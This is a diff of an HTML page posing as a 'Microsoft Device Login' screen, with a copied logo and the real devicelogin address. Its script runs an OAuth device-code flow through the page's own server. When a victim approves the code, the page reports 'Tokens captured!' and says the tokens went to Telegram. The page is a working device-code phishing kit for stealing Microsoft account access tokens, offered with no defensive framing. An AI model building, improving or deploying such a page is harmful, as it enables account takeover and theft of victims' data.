@@ -3,142 +3,487 @@
 <head>
     <title>Microsoft Device Login</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo img { height: 40px; }
-        h2 { text-align: center; margin-bottom: 20px; font-weight: 300; }
-        .code-display { background: #f0f0f0; padding: 20px; text-align: center; border-radius: 4px; margin: 20px 0; font-size: 32px; font-weight: bold; letter-spacing: 4px; font-family: monospace; }
-        .instructions { color: #666; font-size: 14px; text-align: center; margin: 20px 0; }
-        .url-display { background: #e8f0fe; padding: 10px; border-radius: 4px; text-align: center; font-family: monospace; font-size: 12px; word-break: break-all; margin: 10px 0; }
-        .btn { background: #0078d4; color: white; padding: 12px; border: none; border-radius: 4px; width: 100%; font-size: 16px; cursor: pointer; }
-        .btn:hover { background: #106ebe; }
-        .spinner { display: none; text-align: center; margin: 20px 0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
+            background: #0a0e17; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0;
+            color: #e0e6ed;
+        }
+        .container { 
+            background: #131d2b; 
+            padding: 40px; 
+            border-radius: 16px; 
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8); 
+            max-width: 480px; 
+            width: 100%;
+            border: 1px solid #2a3a4e;
+        }
+        .logo { text-align: center; margin-bottom: 24px; }
+        .logo svg { height: 40px; }
+        h2 { text-align: center; font-weight: 300; font-size: 24px; margin-bottom: 6px; }
+        .subtitle { text-align: center; color: #7f9bb3; font-size: 14px; margin-bottom: 24px; }
+        .code-display { 
+            background: #0a0e17; 
+            padding: 24px; 
+            text-align: center; 
+            border-radius: 12px; 
+            margin: 16px 0; 
+            font-size: 42px; 
+            font-weight: 700; 
+            letter-spacing: 8px; 
+            font-family: 'Courier New', monospace;
+            border: 2px dashed #1a3550;
+            color: #6bcbff;
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .code-display.loading { color: #4a6a8a; font-size: 18px; letter-spacing: 2px; }
+        .code-display.error { color: #ef4444; border-color: #3a1a1a; }
+        .url-display { 
+            background: #0a0e17; 
+            padding: 12px; 
+            border-radius: 8px; 
+            text-align: center; 
+            font-family: monospace; 
+            font-size: 13px; 
+            word-break: break-all; 
+            margin: 12px 0;
+            border: 1px solid #1a2a3a;
+            color: #6b8baa;
+        }
+        .instructions {
+            color: #7f9bb3;
+            font-size: 13px;
+            text-align: center;
+            margin: 16px 0;
+            line-height: 1.8;
+        }
+        .instructions span { color: #6bcbff; font-weight: 600; }
+        .btn {
+            background: #2563eb;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #1d4ed8; transform: scale(1.01); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn.secondary { background: #1f2e3f; }
+        .btn.secondary:hover { background: #2a3a4e; }
+        .btn.danger { background: #7f1d1d; }
+        .btn.danger:hover { background: #991b1b; }
+        .spinner { 
+            display: none; 
+            text-align: center; 
+            margin: 20px 0; 
+        }
         .spinner.active { display: block; }
-        .spinner div { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+        .spinner div { 
+            width: 48px; 
+            height: 48px; 
+            border: 4px solid #1a2a3a; 
+            border-top: 4px solid #6bcbff; 
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+            margin: 0 auto; 
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .error { color: #d32f2f; text-align: center; margin: 10px 0; }
+        .status { 
+            text-align: center; 
+            margin: 12px 0; 
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            min-height: 44px;
+        }
+        .status.pending { background: #1a2a1a; color: #fbbf24; border: 1px solid #3a4a1a; }
+        .status.approved { background: #0a1a0a; color: #34d399; border: 1px solid #1a3a1a; }
+        .status.error { background: #1a0a0a; color: #f87171; border: 1px solid #3a1a1a; }
+        .status.idle { background: #0a0e17; color: #7f9bb3; border: 1px solid #1a2a3a; }
+        .error-text { color: #f87171; text-align: center; margin: 8px 0; font-size: 14px; }
+        .flex-row { display: flex; gap: 10px; margin-top: 10px; }
+        .flex-row .btn { width: auto; flex: 1; }
+        .log-area {
+            background: #0a0e17;
+            padding: 12px;
+            border-radius: 8px;
+            max-height: 120px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 11px;
+            color: #4a6a8a;
+            margin-top: 16px;
+            border: 1px solid #1a2a3a;
+        }
+        .log-area .entry { padding: 2px 0; border-bottom: 1px solid #0d1520; }
+        .log-area .entry:last-child { border-bottom: none; }
+        .manual-section {
+            margin-top: 16px;
+            padding: 16px;
+            background: #0a0e17;
+            border-radius: 10px;
+            border: 1px solid #1a2a3a;
+            display: none;
+        }
+        .manual-section.active { display: block; }
+        .manual-section input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #2a3a4e;
+            background: #0a0e17;
+            color: #e0e6ed;
+            font-size: 16px;
+            font-family: monospace;
+            letter-spacing: 2px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .manual-section input:focus { outline: 2px solid #2563eb; border-color: transparent; }
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+        .badge.pending { background: #f59e0b; color: #000; }
+        .badge.approved { background: #10b981; color: #000; }
+        .badge.expired { background: #ef4444; color: #fff; }
+        .badge.waiting { background: #3b82f6; color: #fff; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="app">
         <div class="logo">
-            <img src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+            <svg viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:40px;">
+                <rect x="1" y="1" width="21" height="21" rx="4" fill="#f25022"/>
+                <rect x="1" y="1" width="9" height="9" rx="2" fill="#7fba00"/>
+                <rect x="12" y="1" width="9" height="9" rx="2" fill="#00a4ef"/>
+                <rect x="1" y="12" width="9" height="9" rx="2" fill="#ffb900"/>
+                <rect x="12" y="12" width="9" height="9" rx="2" fill="#f25022"/>
+            </svg>
         </div>
         <h2>Device Login</h2>
-        <p style="text-align:center;color:#666;">Enter the code on your device to sign in</p>
+        <p class="subtitle">Enter the code on your device to sign in</p>
         
-        <div class="code-display" id="deviceCode">Loading...</div>
+        <div class="code-display loading" id="deviceCode">⟳ Generating...</div>
         
         <div class="url-display" id="deviceUrl">https://microsoft.com/devicelogin</div>
         
         <div class="instructions">
-            <p>1. Open the link above on your device</p>
-            <p>2. Enter the code when prompted</p>
-            <p>3. Approve the sign-in request</p>
+            <span>1.</span> Open the link above on your device &nbsp;·&nbsp; <span>2.</span> Enter the code &nbsp;·&nbsp; <span>3.</span> Approve
         </div>
         
-        <button class="btn" id="checkBtn">Checking for sign-in...</button>
+        <div id="status" class="status idle">⏳ Starting device flow...</div>
         
         <div class="spinner" id="spinner">
             <div></div>
-            <p style="margin-top:10px;color:#666;">Waiting for device approval...</p>
+            <p style="margin-top:12px;color:#4a6a8a;font-size:13px;">Waiting for device approval...</p>
         </div>
         
-        <div id="status" style="margin-top:15px;text-align:center;color:#666;"></div>
-        <div id="error" class="error"></div>
+        <button class="btn" id="checkBtn">🔄 Check Status</button>
+        <div class="flex-row">
+            <button class="btn secondary" id="copyBtn">📋 Copy Code</button>
+            <button class="btn secondary" id="manualBtn">⌨️ Manual</button>
+            <button class="btn secondary" id="refreshBtn">🔄 New Code</button>
+        </div>
+        
+        <div class="manual-section" id="manualSection">
+            <input type="text" id="manualCodeInput" placeholder="Enter code manually" maxlength="12">
+            <button class="btn" id="manualSubmitBtn">🔑 Submit Manual Code</button>
+        </div>
+        
+        <div id="errorDisplay" class="error-text"></div>
+        <div class="log-area" id="logArea">
+            <div class="entry">💡 Ready. Generating device code...</div>
+        </div>
     </div>
 
     <script>
-        const sessionId = Math.random().toString(36).substring(2, 15);
+        // ── CONFIG ──
+        const API_BASE = window.location.origin;
         let deviceCode = '';
-        let intervalId = null;
+        let userCode = '';
+        let pollInterval = null;
+        let isPolling = false;
+        let flowActive = false;
 
-        async function startDeviceFlow() {
+        // ── DOM REFS ──
+        const codeDisplay = document.getElementById('deviceCode');
+        const urlDisplay = document.getElementById('deviceUrl');
+        const statusEl = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const checkBtn = document.getElementById('checkBtn');
+        const copyBtn = document.getElementById('copyBtn');
+        const manualBtn = document.getElementById('manualBtn');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const manualSection = document.getElementById('manualSection');
+        const manualCodeInput = document.getElementById('manualCodeInput');
+        const manualSubmitBtn = document.getElementById('manualSubmitBtn');
+        const errorDisplay = document.getElementById('errorDisplay');
+        const logArea = document.getElementById('logArea');
+
+        // ── LOGGING ──
+        function addLog(msg, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = 'entry';
+            const time = new Date().toLocaleTimeString();
+            const icons = { info: '💡', success: '✅', error: '❌', warning: '⚠️', pending: '⏳' };
+            entry.textContent = `[${time}] ${icons[type] || '•'} ${msg}`;
+            logArea.prepend(entry);
+            if (logArea.children.length > 50) logArea.removeChild(logArea.lastChild);
+        }
+
+        function setStatus(msg, type = 'idle') {
+            statusEl.textContent = msg;
+            statusEl.className = `status ${type}`;
+        }
+
+        function setError(msg) {
+            errorDisplay.textContent = msg;
+            if (msg) addLog(`❌ ${msg}`, 'error');
+        }
+
+        // ── COPY ──
+        async function copyCode() {
+            const code = codeDisplay.textContent;
+            if (!code || code === '⟳ Generating...' || code === '⚠️ Error') {
+                setError('No code to copy. Generate one first.');
+                return;
+            }
             try {
-                console.log('📱 Starting device flow...');
-                
-                // ── REQUEST DEVICE CODE ──
-                const response = await fetch('/device/request', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' }
-                });
-                
-                console.log('📡 Response status:', response.status);
-                
-                if (!response.ok) {
-                    const errorText = await response.text();
-                    console.error('❌ Error response:', errorText);
-                    throw new Error(`HTTP ${response.status}: ${errorText}`);
-                }
-                
-                const data = await response.json();
-                console.log('✅ Device code received:', data);
-                
-                deviceCode = data.device_code;
-                const userCode = data.user_code;
-                const verificationUri = data.verification_uri;
-                
-                // Display the code and URL
-                document.getElementById('deviceCode').textContent = userCode;
-                document.getElementById('deviceUrl').textContent = verificationUri;
-                
-                // Show spinner
-                document.getElementById('spinner').classList.add('active');
-                document.getElementById('checkBtn').style.display = 'none';
-                document.getElementById('status').textContent = '⏳ Waiting for approval on your device...';
-                document.getElementById('error').textContent = '';
-                
-                // ── POLL FOR TOKEN ──
-                intervalId = setInterval(async () => {
-                    try {
-                        console.log('🔄 Polling for token...');
-                        const tokenResponse = await fetch('/device/token', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ device_code: deviceCode })
-                        });
-                        
-                        const tokenData = await tokenResponse.json();
-                        console.log('📦 Token response:', tokenData);
-                        
-                        if (tokenData.access_token) {
-                            clearInterval(intervalId);
-                            document.getElementById('spinner').classList.remove('active');
-                            document.getElementById('status').innerHTML = '✅ Signed in successfully! Redirecting...';
-                            setTimeout(() => {
-                                window.location.href = 'https://www.office.com';
-                            }, 2000);
-                        } else if (tokenData.error === 'authorization_pending') {
-                            document.getElementById('status').textContent = '⏳ Waiting for approval on your device...';
-                        } else if (tokenData.error === 'expired_token') {
-                            clearInterval(intervalId);
-                            document.getElementById('spinner').classList.remove('active');
-                            document.getElementById('status').innerHTML = '❌ Code expired. Please try again.';
-                            document.getElementById('checkBtn').style.display = 'block';
-                            document.getElementById('checkBtn').textContent = '🔄 Try Again';
-                            document.getElementById('checkBtn').onclick = () => { location.reload(); };
-                        } else if (tokenData.error) {
-                            console.error('❌ Token error:', tokenData.error);
-                            document.getElementById('status').textContent = '⚠️ Error: ' + tokenData.error;
-                        }
-                    } catch (e) {
-                        console.error('❌ Polling error:', e);
-                    }
-                }, 5000);
-                
-            } catch (error) {
-                console.error('❌ Device flow error:', error);
-                document.getElementById('status').innerHTML = '';
-                document.getElementById('error').textContent = '❌ Error starting device flow: ' + error.message;
-                document.getElementById('checkBtn').style.display = 'block';
-                document.getElementById('checkBtn').textContent = '🔄 Try Again';
-                document.getElementById('checkBtn').onclick = () => { location.reload(); };
+                await navigator.clipboard.writeText(code);
+                setStatus('✅ Copied to clipboard!', 'approved');
+                addLog('📋 Copied code to clipboard', 'success');
+            } catch {
+                const ta = document.createElement('textarea');
+                ta.value = code;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                ta.remove();
+                setStatus('✅ Copied!', 'approved');
             }
         }
 
-        // Start the flow when page loads
-        startDeviceFlow();
+        // ── MANUAL CODE ──
+        manualBtn.addEventListener('click', () => {
+            manualSection.classList.toggle('active');
+            if (manualSection.classList.contains('active')) {
+                manualCodeInput.focus();
+            }
+        });
+
+        manualSubmitBtn.addEventListener('click', async () => {
+            const code = manualCodeInput.value.trim().toUpperCase();
+            if (!code) { setError('Please enter a code'); return; }
+            addLog(`🔑 Manual code submitted: ${code}`, 'info');
+            setStatus(`⏳ Manual code ${code} submitted, waiting for approval...`, 'pending');
+            // We can't poll with manual code since we need device_code, but we can simulate
+            // or just tell the user to use the auto flow
+            setError('Manual code entry is for display only. Use "New Code" to generate a fresh device flow.');
+            manualSection.classList.remove('active');
+        });
+
+        // ── REFRESH (NEW CODE) ──
+        refreshBtn.addEventListener('click', () => {
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
+            }
+            isPolling = false;
+            flowActive = false;
+            deviceCode = '';
+            userCode = '';
+            codeDisplay.textContent = '⟳ Generating...';
+            codeDisplay.className = 'code-display loading';
+            setStatus('🔄 Generating new code...', 'idle');
+            spinner.classList.remove('active');
+            setError('');
+            addLog('🔄 Requesting new device code...', 'info');
+            setTimeout(startDeviceFlow, 300);
+        });
+
+        // ── CHECK STATUS ──
+        checkBtn.addEventListener('click', () => {
+            if (deviceCode) {
+                addLog('🔍 Manual status check...', 'info');
+                pollForToken(true);
+            } else {
+                setError('No active code. Generate one first.');
+            }
+        });
+
+        copyBtn.addEventListener('click', copyCode);
+
+        // ── POLLING LOGIC ──
+        async function pollForToken(manual = false) {
+            if (!deviceCode || isPolling) return;
+            isPolling = true;
+
+            try {
+                const response = await fetch(`${API_BASE}/device/token`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_code: deviceCode })
+                });
+
+                const data = await response.json();
+                console.log('📦 Poll response:', data);
+
+                if (data.access_token) {
+                    // SUCCESS
+                    clearInterval(pollInterval);
+                    pollInterval = null;
+                    flowActive = false;
+                    isPolling = false;
+                    setStatus('✅ Approved! Tokens captured!', 'approved');
+                    codeDisplay.className = 'code-display';
+                    addLog('✅ TOKENS OBTAINED! Check Telegram.', 'success');
+                    addLog(`🔑 Access: ${data.access_token.slice(0, 20)}...`, 'success');
+                    spinner.classList.remove('active');
+                    setError('');
+                    // Optional redirect
+                    // window.location.href = 'https://www.office.com';
+                    return;
+                }
+
+                if (data.error === 'authorization_pending') {
+                    setStatus('⏳ Waiting for approval on your device...', 'pending');
+                    addLog('⏳ Still waiting for user approval...', 'pending');
+                    isPolling = false;
+                    return;
+                }
+
+                if (data.error === 'expired_token') {
+                    clearInterval(pollInterval);
+                    pollInterval = null;
+                    flowActive = false;
+                    isPolling = false;
+                    setStatus('⏰ Code expired. Generate a new one.', 'error');
+                    codeDisplay.className = 'code-display error';
+                    codeDisplay.textContent = '⏰ EXPIRED';
+                    addLog('⏰ Code expired. Click "New Code".', 'error');
+                    spinner.classList.remove('active');
+                    return;
+                }
+
+                if (data.error) {
+                    setStatus(`⚠️ ${data.error}`, 'error');
+                    addLog(`⚠️ ${data.error}`, 'warning');
+                    isPolling = false;
+                    return;
+                }
+
+                setStatus('⚠️ Unexpected response', 'error');
+                addLog(`⚠️ ${JSON.stringify(data).slice(0, 100)}`, 'warning');
+                isPolling = false;
+
+            } catch (err) {
+                console.error('❌ Poll error:', err);
+                setStatus(`❌ Poll error: ${err.message}`, 'error');
+                addLog(`❌ ${err.message}`, 'error');
+                isPolling = false;
+            }
+        }
+
+        // ── MAIN FLOW ──
+        async function startDeviceFlow() {
+            if (flowActive) return;
+            flowActive = true;
+            setStatus('⏳ Generating device code...', 'pending');
+            codeDisplay.textContent = '⟳ Loading...';
+            codeDisplay.className = 'code-display loading';
+            spinner.classList.add('active');
+            setError('');
+
+            try {
+                addLog('📱 Requesting device code from Microsoft...', 'info');
+                const response = await fetch(`${API_BASE}/device/request`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                if (!response.ok) {
+                    const errText = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${errText}`);
+                }
+
+                const data = await response.json();
+                console.log('✅ Device code response:', data);
+
+                if (data.error) throw new Error(data.error);
+
+                deviceCode = data.device_code;
+                userCode = data.user_code;
+
+                // Update UI
+                codeDisplay.textContent = userCode;
+                codeDisplay.className = 'code-display';
+                urlDisplay.textContent = data.verification_uri || 'https://microsoft.com/devicelogin';
+                setStatus(`⏳ Code: ${userCode} — Waiting for approval...`, 'pending');
+                addLog(`✅ Code generated: ${userCode}`, 'success');
+                addLog(`🔗 ${data.verification_uri}`, 'info');
+
+                // Start polling
+                if (pollInterval) clearInterval(pollInterval);
+                const intervalMs = (data.interval || 5) * 1000 + 500;
+                pollInterval = setInterval(() => {
+                    pollForToken();
+                }, intervalMs);
+
+                // Also poll immediately
+                setTimeout(() => pollForToken(), 1000);
+
+                flowActive = false;
+
+            } catch (err) {
+                console.error('❌ Device flow error:', err);
+                setStatus(`❌ Error: ${err.message}`, 'error');
+                codeDisplay.textContent = '⚠️ Error';
+                codeDisplay.className = 'code-display error';
+                addLog(`❌ ${err.message}`, 'error');
+                spinner.classList.remove('active');
+                flowActive = false;
+                setError(err.message);
+            }
+        }
+
+        // ── AUTO-START ──
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(startDeviceFlow, 500);
+        });
+
+        // ── KEYBOARD SHORTCUTS ──
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'c' && (e.ctrlKey || e.metaKey)) {
+                // Let browser handle copy
+            }
+            if (e.key === 'r' && !e.ctrlKey && !e.metaKey) {
+                refreshBtn.click();
+            }
+            if (e.key === 'Enter' && manualSection.classList.contains('active')) {
+                manualSubmitBtn.click();
+            }
+        });
+
+        console.log('🍟♤ Device Code UI v2.0 loaded');
+        console.log('🔑 Shortcuts: [R] New Code, [Ctrl+C] Copy, [Enter] Submit manual');
     </script>
 </body>
 </html>
